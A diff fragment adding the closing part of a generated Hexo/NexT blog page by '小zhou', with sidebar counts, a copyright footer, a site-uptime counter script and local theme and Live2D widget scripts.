+      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+  <p class="site-author-name" itemprop="name">小zhou</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小zhou</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">88k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:19</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
